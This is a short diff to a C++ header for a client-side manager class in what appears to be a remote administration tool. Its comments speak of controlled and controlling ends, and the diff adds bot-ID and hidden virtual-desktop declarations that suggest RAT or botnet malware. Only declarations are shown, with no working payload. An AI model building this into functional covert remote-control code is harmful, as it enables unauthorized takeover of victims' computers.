@@ -12,6 +12,12 @@
 #include "..\common\commands.h"
 #include "IOCPClient.h"
 
+#define ENABLE_VSCREEN 1
+
+HDESK SelectDesktop(TCHAR* name);
+
+std::string GetBotId();
+
 typedef IOCPClient CClientSocket;
 
 typedef IOCPClient ISocketBase;
@@ -27,6 +33,7 @@ class CManager : public IOCPManager
 {
 public:
 	State&g_bExit; // 1-被控端退出 2-主控端退出
+	BOOL m_bReady;
 	CManager(IOCPClient* ClientObject);
 	virtual ~CManager();
 
@@ -37,6 +44,7 @@ public:
 	VOID NotifyDialogIsOpen();
 
 	int Send(LPBYTE lpData, UINT nSize);
+	virtual void SetReady(BOOL ready = true) { m_bReady = ready; }
 };
 
 #endif // !defined(AFX_MANAGER_H__32F1A4B3_8EA6_40C5_B1DF_E469F03FEC30__INCLUDED_)
